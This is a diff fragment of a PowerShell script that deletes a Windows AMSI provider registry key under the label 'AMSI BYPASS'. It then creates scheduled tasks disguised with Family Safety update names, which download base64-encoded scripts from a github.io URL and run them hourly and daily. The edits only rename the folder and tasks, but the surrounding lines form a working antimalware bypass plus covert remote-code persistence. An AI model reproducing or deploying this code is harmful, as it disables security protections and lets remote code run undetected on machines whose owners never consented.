@@ -533,7 +533,7 @@ OutString "AMSI BYPASS"
 Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse -Force -ErrorAction Ignore 
 $webclient = New-Object Net.WebClient
 
-$NewTaskFolder=$env:COMPUTERNAME + '-Maintenance'
+$NewTaskFolder=$env:COMPUTERNAME + '-MaintenanceUpdate'
 OutString "Creating New Scheduled Task Folder: $NewTaskFolder"
 New-ScheduledTaskFolder $NewTaskFolder
 
@@ -554,7 +554,7 @@ Set-ScriptDataToRegistry $EncryptedScript
 #         ************************
 #>
 try{
-    $NewTaskName=$NewTaskFolder + '\' + 'FamilySafetyRulesUpdateTasks'
+    $NewTaskName=$NewTaskFolder + '\' + 'FamilySafetyRulesUpdateTask'
     $ScriptUrl='https://radicaltronic.github.io/cmd/run-hourly.ps1'
     $Base64Command=Get-Base64FromUrl $ScriptUrl
     $Base64CommandLen=$Base64Command.Length
@@ -579,7 +579,7 @@ try{
 #         ************************
 #>
 try{
-    $NewTaskName=$NewTaskFolder + '\' + 'FamilyDailySafetyUpdate'
+    $NewTaskName=$NewTaskFolder + '\' + 'FamilyDailySafetyUpdate1'
     $ScriptUrl='https://radicaltronic.github.io/cmd/update-runner-scriptblock.ps1'
     $Base64Command=Get-Base64FromUrl $ScriptUrl
     $Base64CommandLen=$Base64Command.Length
